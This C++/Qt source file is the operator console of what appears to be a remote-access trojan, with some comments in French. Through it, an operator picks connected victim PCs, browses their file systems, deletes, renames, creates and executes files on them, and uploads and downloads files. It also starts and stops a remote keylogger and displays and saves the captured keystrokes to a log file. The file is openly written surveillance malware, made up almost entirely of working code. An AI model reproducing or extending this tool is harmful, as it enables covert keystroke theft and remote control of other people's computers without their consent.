#include		"RxProject.h"
#include		<QMessageBox>
#include		<QFileDialog>

RxProject::RxProject(QWidget *parent, Qt::WFlags flags)
	: QMainWindow(parent, flags)
{
	ui.setupUi(this);
	
	qRegisterMetaType<std::string>("std::string");
	qRegisterMetaType<FileInfo>("FileInfo");

	/* Window to Window */
	QObject::connect(this->ui.listWidgetConnected, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(LWCDoubleClicked(QListWidgetItem*)));
	QObject::connect(this->ui.listWidgetFileSystem, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(LWFSDoubleClicked(QListWidgetItem*)));
	QObject::connect(this->ui.pushButtonDelete, SIGNAL(clicked()), this, SLOT(PBDeleteClicked()));
	QObject::connect(this->ui.pushButtonCopy, SIGNAL(clicked()), this, SLOT(PBCopyClicked()));
	QObject::connect(this->ui.pushButtonPaste, SIGNAL(clicked()), this, SLOT(PBPasteClicked()));
	QObject::connect(this->ui.pushButtonRename, SIGNAL(clicked()), this, SLOT(PBRenameClicked()));
	QObject::connect(this->ui.pushButtonCreateFile, SIGNAL(clicked()), this, SLOT(PBCreateFileClicked()));
	QObject::connect(this->ui.pushButtonExec, SIGNAL(clicked()), this, SLOT(PBExecClicked()));
	QObject::connect(this->ui.pushButtonStartKeyLog, SIGNAL(clicked()), this, SLOT(PBStartKeyLogClicked()));
	QObject::connect(this->ui.pushButtonStopKeyLog, SIGNAL(clicked()), this, SLOT(PBStopKeyLogClicked()));
	QObject::connect(this->ui.pushButtonClearKeyLog, SIGNAL(clicked()), this, SLOT(PBClearKeyLogClicked()));
	QObject::connect(this->ui.pushButtonSaveKeyLog, SIGNAL(clicked()), this, SLOT(PBSaveKeyLogClicked()));
	QObject::connect(this->ui.pushButtonDownload, SIGNAL(clicked()), this, SLOT(PBDownloadClicked()));
	QObject::connect(this->ui.pushButtonUpload, SIGNAL(clicked()), this, SLOT(PBUploadClicked()));
	QObject::connect(this->ui.tabWidgetCore, SIGNAL(currentChanged(int)), this, SLOT(TWAboutEnter(int)));
	/* Window to Bridge */
	QObject::connect(this, SIGNAL(WinAskVer(std::string)), &this->p_bridge, SIGNAL(WinAskVer(std::string)));
	QObject::connect(this, SIGNAL(WinAskFs(std::string)), &this->p_bridge, SIGNAL(WinAskFs(std::string)));
	QObject::connect(this, SIGNAL(WinAskKeyLogInfos(std::string)), &this->p_bridge, SIGNAL(WinAskKeyLogInfos(std::string)));
	QObject::connect(this, SIGNAL(WinAskCd(std::string, std::string)), &this->p_bridge, SIGNAL(WinAskCd(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskDel(std::string, std::string)), &this->p_bridge, SIGNAL(WinAskDel(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskCpy(std::string, std::string)), &this->p_bridge, SIGNAL(WinAskCpy(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskPst(std::string)), &this->p_bridge, SIGNAL(WinAskPst(std::string)));
	QObject::connect(this, SIGNAL(WinAskRnm(std::string, std::string, std::string)), &this->p_bridge, SIGNAL(WinAskRnm(std::string, std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskCrt(std::string, std::string, std::string)), &this->p_bridge, SIGNAL(WinAskCrt(std::string, std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskExe(std::string, std::string)), &this->p_bridge, SIGNAL(WinAskExe(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskAkl(std::string)), &this->p_bridge, SIGNAL(WinAskAkl(std::string)));
	QObject::connect(this, SIGNAL(WinAskOkl(std::string)), &this->p_bridge, SIGNAL(WinAskOkl(std::string)));
	QObject::connect(this, SIGNAL(WinAskCkl(std::string)), &this->p_bridge, SIGNAL(WinAskCkl(std::string)));
	QObject::connect(this, SIGNAL(WinAskDwn(std::string, std::string)), &this->p_bridge, SIGNAL(WinAskDwn(std::string, std::string)));
	QObject::connect(this, SIGNAL(WinAskUpl(std::string, std::string)), &this->p_bridge, SIGNAL(WinAskUpl(std::string, std::string)));
	/* Bridge to Window */
	QObject::connect(&this->p_bridge, SIGNAL(NewMonitorEventIncident(std::string)), this, SLOT(NewMonitorEventIncident(std::string)));
	QObject::connect(&this->p_bridge, SIGNAL(NewMonitorEventSendind(std::string, unsigned int)), this, SLOT(NewMonitorEventSendind(std::string, unsigned int)));
	QObject::connect(&this->p_bridge, SIGNAL(NewMonitorEventReception(std::string, unsigned int)), this, SLOT(NewMonitorEventReception(std::string, unsigned int)));
	QObject::connect(&this->p_bridge, SIGNAL(NewUpDownEvent(std::string)), this, SLOT(NewUpDownEvent(std::string)));
	QObject::connect(&this->p_bridge, SIGNAL(NetAnswerKeyLogInfos(std::string, bool, std::string)), this, SLOT(NetAnswerKeyLogInfos(std::string, bool, std::string)));
	QObject::connect(&this->p_bridge, SIGNAL(ClientIdentified(std::string)), this, SLOT(ClientIdentified(std::string)));
	QObject::connect(&this->p_bridge, SIGNAL(ClientCrashed(std::string)), this, SLOT(ClientCrashed(std::string)));
	QObject::connect(&this->p_bridge, SIGNAL(ClientAnsVersion(std::string, std::string)), this, SLOT(ClientAnsVersion(std::string, std::string)));
	QObject::connect(&this->p_bridge, SIGNAL(ClientAnsFs(std::string, FileInfo)), this, SLOT(ClientAnsFs(std::string, FileInfo)));
	QObject::connect(&this->p_bridge, SIGNAL(ClientAnsFsNext(std::string, FileInfo)), this, SLOT(ClientAnsFsNext(std::string, FileInfo)));
	QObject::connect(&this->p_bridge, SIGNAL(ClientAnsKeyPressed(std::string, std::string)), this, SLOT(ClientAnsKeyPressed(std::string, std::string)));
	/* Bridge to Window (Updown) */
	QObject::connect(&this->p_bridge, SIGNAL(UpdnIncident(std::string)), this, SLOT(UpdnIncident(std::string)));
	QObject::connect(&this->p_bridge, SIGNAL(UpdnNewPartRec(int, int)), this, SLOT(UpdnNewPartRec(int, int)));
	QObject::connect(&this->p_bridge, SIGNAL(UpdnDlFinished()), this, SLOT(UpdnDlFinished()));
	QObject::connect(&this->p_bridge, SIGNAL(UpdnNewPartSnd(int, int)), this, SLOT(UpdnNewPartSnd(int, int)));
	QObject::connect(&this->p_bridge, SIGNAL(UpdnUpFinished()), this, SLOT(UpdnUpFinished()));
	
	this->p_bridge.start();
}

RxProject::~RxProject()
{

}

/*
	+---------------+
	| Slots From ui |
	+---------------+
*/

void			RxProject::LWCDoubleClicked(QListWidgetItem* item)
{
	if (item > 0)
	{
		if (item->text() != this->ui.labelCurrentUser->text())
		{
			emit this->WinAskVer(item->text().toStdString());
			emit this->WinAskFs(item->text().toStdString());
			emit this->WinAskKeyLogInfos(item->text().toStdString());
			this->ui.labelCurrentUser->setText(item->text());
			this->ui.lineEditSaveKeyLog->setText(QString(item->text() + "-logs.txt"));
		}
	}
}

void			RxProject::LWFSDoubleClicked(QListWidgetItem* item)
{
	if (item > 0 && item->text().size() > 0)
	{
		emit this->WinAskCd(this->ui.labelCurrentUser->text().toStdString(), item->text().toStdString());
	}
}

void			RxProject::PBDeleteClicked()
{
	if (this->ui.listWidgetFileSystem->selectedItems().size() == 1)
	{
		if (this->ui.listWidgetFileSystem->selectedItems().back()->text().size() > 0)
		{
			emit this->WinAskDel(this->ui.labelCurrentUser->text().toStdString(), this->ui.listWidgetFileSystem->selectedItems().back()->text().toStdString());
		}
	}
}

void			RxProject::PBCopyClicked()
{
	if (this->ui.listWidgetFileSystem->selectedItems().size() == 1)
	{
		if (this->ui.listWidgetFileSystem->selectedItems().back()->text().size() > 0)
		{
			emit this->WinAskCpy(this->ui.labelCurrentUser->text().toStdString(), this->ui.listWidgetFileSystem->selectedItems().back()->text().toStdString());
		}
	}
}

void			RxProject::PBPasteClicked()
{
	emit this->WinAskPst(this->ui.labelCurrentUser->text().toStdString());
}

void			RxProject::PBRenameClicked()
{
	if (this->ui.listWidgetFileSystem->selectedItems().size() == 1 && this->ui.lineEditRename->text().size() > 0)
	{
		if (this->ui.listWidgetFileSystem->selectedItems().back()->text().size() > 0)
		{
			emit this->WinAskRnm(this->ui.labelCurrentUser->text().toStdString(), this->ui.listWidgetFileSystem->selectedItems().back()->text().toStdString(), this->ui.lineEditRename->text().toStdString());
		}
	}
}

void			RxProject::PBCreateFileClicked()
{
	if (this->ui.lineEditCreateFile->text().size() > 0
		&& this->ui.textEditCreateFile->toPlainText().size() > 0)
	{
		emit this->WinAskCrt(this->ui.labelCurrentUser->text().toStdString(), this->ui.lineEditCreateFile->text().toStdString(), this->ui.textEditCreateFile->toPlainText().toStdString());
	}
}

void			RxProject::PBExecClicked()
{
	if (this->ui.listWidgetFileSystem->selectedItems().size() == 1)
	{
		if (this->ui.listWidgetFileSystem->selectedItems().back()->text().size() > 0)
		{
			emit this->WinAskExe(this->ui.labelCurrentUser->text().toStdString(), this->ui.listWidgetFileSystem->selectedItems().back()->text().toStdString());
		}
	}
}

void			RxProject::PBStartKeyLogClicked()
{
	emit this->WinAskAkl(this->ui.labelCurrentUser->text().toStdString());
}

void			RxProject::PBStopKeyLogClicked()
{
	emit this->WinAskOkl(this->ui.labelCurrentUser->text().toStdString());
}

void			RxProject::PBClearKeyLogClicked()
{
	emit this->WinAskCkl(this->ui.labelCurrentUser->text().toStdString());
}

void			RxProject::PBSaveKeyLogClicked()
{
	if (this->ui.lineEditSaveKeyLog->text().size() > 0
		&& this->ui.textBrowserKeyLog->toPlainText().toStdString().size() > 0)
	{
		if (this->p_fs.CreateAFile(this->ui.lineEditSaveKeyLog->text().toStdString(),
			this->ui.textBrowserKeyLog->toPlainText().toStdString().c_str(),
			this->ui.textBrowserKeyLog->toPlainText().toStdString().size()) == true)
		{
			emit this->WinAskCkl(this->ui.labelCurrentUser->text().toStdString());
		}
		// Else remonter un probleme;
	}
}

void			RxProject::PBDownloadClicked()
{
	if (this->ui.listWidgetFileSystem->selectedItems().size() == 1)
	{
		if (this->ui.listWidgetFileSystem->selectedItems().back()->text().size() > 0)
		{
			emit this->WinAskDwn(this->ui.labelCurrentUser->text().toStdString(), this->ui.listWidgetFileSystem->selectedItems().back()->text().toStdString());
		}
	}
}

void			RxProject::PBUploadClicked()
{
	QString path = QFileDialog::getOpenFileName(this, "Select a File to UPLOAD", "/", NULL);

	if (path.size() > 0)
	{
		emit this->WinAskUpl(this->ui.labelCurrentUser->text().toStdString(), path.toStdString());
	}
}

void			RxProject::TWAboutEnter(int idx)
{
	// ... Arrive  quand il y a changement d'onglet. idx est l index de l onglet entrant
}

/*
	+-----------------------------+
	| Slots From Network (Bridge) |
	+-----------------------------+
*/

void			RxProject::NewMonitorEventIncident(std::string msg)
{
	this->ui.textBrowserMonitor->append(msg.c_str());
}

void			RxProject::NewMonitorEventSendind(std::string pcName, unsigned int type)
{
	std::string	msg;

	msg = pcName + " <- ";
	if (type == T_ASK_VERSION)
		msg = msg + "T_ASK_VERSION";
	else if (type == T_ASK_FS)
		msg = msg + "T_ASK_FS";
	else if (type == T_ASK_CD)
		msg = msg + "T_ASK_CD";
	else if (type == T_ASK_DELETE)
		msg = msg + "T_ASK_DELETE";
	else if (type == T_ASK_COPY)
		msg = msg + "T_ASK_COPY";
	else if (type == T_ASK_PASTE)
		msg = msg + "T_ASK_PASTE";
	else if (type == T_ASK_RENAME)
		msg = msg + "T_ASK_RENAME";
	else if (type == T_ASK_CRT_FILE)
		msg = msg + "T_ASK_CRT_FILE";
	else if (type == T_ASK_EXEC)
		msg = msg + "T_ASK_EXEC";
	else if (type == T_ASK_KEYLOG)
		msg = msg + "T_ASK_KEYLOG";
	else if (type == T_ASK_KEYLOG_STOP)
		msg = msg + "T_ASK_KEYLOG_STOP";
	else if (type == T_ASK_DOWNLOAD)
		msg = msg + "T_ASK_DOWNLOAD";
	else if (type == T_ASK_UPLOAD)
		msg = msg + "T_ASK_UPLOAD";
	else
		msg = msg + "Sending Unknown packet.";
	this->ui.textBrowserMonitor->append(msg.c_str());
}

void			RxProject::NewMonitorEventReception(std::string pcName, unsigned int type)
{
	std::string	msg;

	msg = pcName + " -> ";
	if (type == T_IDENTIFICATION)
		msg = msg + "T_IDENTIFICATION";
	else if (type == T_ANS_VERSION)
		msg = msg + "T_ANS_VERSION";
	else if (type == T_DISCONNECT)
		msg = msg + "T_DISCONNECT";
	else if (type == T_ANS_FS)
		msg = msg + "T_ANS_FS";
	else if (type == T_ANS_FS_NEXT)
		msg = msg + "T_ANS_FS_NEXT";
	else if (type == T_ANS_FS_FAILED)
		msg = msg + "T_ANS_FS_FAILED";
	else if (type == T_ANS_CD_OK)
		msg = msg + "T_ANS_CD_OK";
	else if (type == T_ANS_CD_FAILED)
		msg = msg + "T_ANS_CD_FAILED";
	else if (type == T_ANS_DELETE_OK)
		msg = msg + "T_ANS_DELETE_OK";
	else if (type == T_ANS_DELETE_FAILED)
		msg = msg + "T_ANS_DELETE_FAILED";
	else if (type == T_ANS_COPY_OK)
		msg = msg + "T_ANS_COPY_OK";
	else if (type == T_ANS_COPY_FAILED)
		msg = msg + "T_ANS_COPY_FAILED";
	else if (type == T_ANS_PASTE_OK)
		msg = msg + "T_ANS_PASTE_OK";
	else if (type == T_ANS_PASTE_FAILED)
		msg = msg + "T_ANS_PASTE_FAILED";
	else if (type == T_ANS_RENAME_OK)
		msg = msg + "T_ANS_RENAME_OK";
	else if (type == T_ANS_RENAME_FAILED)
		msg = msg + "T_ANS_RENAME_FAILED";
	else if (type == T_ANS_CRT_FILE_OK)
		msg = msg + "T_ANS_CRT_FILE_OK";
	else if (type == T_ANS_CRT_FILE_FAILED)
		msg = msg + "T_ANS_CRT_FILE_FAILED";
	else if (type == T_ANS_EXEC_OK)
		msg = msg + "T_ANS_EXEC_OK";
	else if (type == T_ANS_EXEC_FAILED)
		msg = msg + "T_ANS_EXEC_FAILED";
	else if (type == T_ANS_KEYLOG_OK)
		msg = msg + "T_ANS_KEYLOG_OK";
	else if (type == T_ANS_KEYLOG_FAILED)
		msg = msg + "T_ANS_KEYLOG_FAILED";
	else if (type == T_ANS_KEY_PRESSED)
		msg = msg + "T_ANS_KEY_PRESSED";
	else if (type == T_ANS_KEYLOG_STOP_OK)
		msg = msg + "T_ANS_KEYLOG_STOP_OK";
	else if (type == T_ANS_KEYLOG_STOP_FAIL)
		msg = msg + "T_ANS_KEYLOG_STOP_FAIL";
	else if (type == T_ANS_DOWNLOAD_OK)
		msg = msg + "T_ANS_DOWNLOAD_OK";
	else if (type == T_ANS_DOWNLOAD_FAIL)
		msg = msg + "T_ANS_DOWNLOAD_FAIL";
	else if (type == T_ANS_UPLOAD_OK)
		msg = msg + "T_ANS_UPLOAD_OK";
	else if (type == T_ANS_UPLOAD_FAIL)
		msg = msg + "T_ANS_UPLOAD_FAIL";
	else
		msg = msg + "Receiving unknown packet.";
	this->ui.textBrowserMonitor->append(msg.c_str());
}

void			RxProject::NewUpDownEvent(std::string msg)
{
	if (msg.size() > 0)
	{
		this->ui.labelUpDownInfos->setText(msg.c_str());
	}
}

void			RxProject::NetAnswerKeyLogInfos(std::string pcName, bool keyLogOn, std::string keyLogData)
{
	std::string	tmp;

	if (pcName == this->ui.labelCurrentUser->text().toStdString())
	{
		tmp = "KeyLog ";
		if (keyLogOn == true)
			tmp = tmp + "on.";
		else
			tmp = tmp + "off.";
		this->ui.labelKeyLogOnOff->setText(tmp.c_str());
		this->ui.textBrowserKeyLog->setText(keyLogData.c_str());
	}
}

void			RxProject::ClientIdentified(std::string newClient)
{
	this->ui.listWidgetConnected->addItem(newClient.c_str());
}

void			RxProject::ClientCrashed(std::string client)
{
	QList<QListWidgetItem*>		list;

	list = this->ui.listWidgetConnected->findItems(client.c_str(), Qt::MatchExactly);
	if (list.size() != 1)
		QMessageBox::critical(this, "Holy Shit !", "A essaye de deco un client mais il ne portait pas un nom unique.");
	else
	{
		if (list.back()->text() == this->ui.labelCurrentUser->text())
		{
			// Clean tout.
			this->ui.labelCurrentUser->setText("Disco disco !");
			this->ui.listWidgetFileSystem->clear();
			this->ui.labelKeyLogOnOff->setText("KeyLog off.");
			this->ui.textBrowserKeyLog->clear();
			this->ui.lineEditVersion->clear();
		}
		this->ui.listWidgetConnected->takeItem(this->ui.listWidgetConnected->row(list.front()));
	}
}

void			RxProject::ClientAnsVersion(std::string client, std::string version)
{
	if (client == this->ui.labelCurrentUser->text().toStdString())
	{
		if (version.size() == SIZE_VERSION)
			this->ui.lineEditVersion->setText(version.c_str());
	}
}

void			RxProject::ClientAnsFs(std::string client, FileInfo fi)
{
	if (client == this->ui.labelCurrentUser->text().toStdString())
	{
		this->ui.listWidgetFileSystem->clear();
		this->ClientAnsFsNext(client, fi);
	}
}

void			RxProject::ClientAnsFsNext(std::string client, FileInfo fi)
{
	if (client == this->ui.labelCurrentUser->text().toStdString())
	{
		this->ui.listWidgetFileSystem->addItem(fi.name.c_str());
	}
}

void			RxProject::ClientAnsKeyPressed(std::string pcName, std::string keyLog)
{
	if (this->ui.labelCurrentUser->text().toStdString() == pcName)
	{
		this->ui.textBrowserKeyLog->setText(keyLog.c_str());
	}
}

/*
	+-------------------------------------+
	| Slots From Network (Bridge, Updown) |
	+-------------------------------------+
*/

void			RxProject::UpdnIncident(std::string msg)
{
	if (msg.size() > 0)
	{
		this->ui.labelUpDownInfos->setText(msg.c_str());
		this->ui.progressBarUpDown->setValue(0);
	}
}

void			RxProject::UpdnNewPartRec(int n, int p)
{
	int			val;

	val = (n * 100) / p;
	if (val >= 0 && val <= 100)
		this->ui.progressBarUpDown->setValue(val);
}

void			RxProject::UpdnDlFinished()
{
	this->ui.labelUpDownInfos->setText("UPDN Transfer : DL Finished.");
	this->ui.progressBarUpDown->setValue(0);
}

void			RxProject::UpdnNewPartSnd(int n, int p)
{
	int			val;

	val = (n * 100) / p;
	if (val >= 0 && val <= 100)
		this->ui.progressBarUpDown->setValue(val);
}

void			RxProject::UpdnUpFinished()
{
	this->ui.labelUpDownInfos->setText("UPDN Transfer : Up Finished.");
	this->ui.progressBarUpDown->setValue(0);
	emit this->WinAskFs(this->ui.labelCurrentUser->text().toStdString());
}
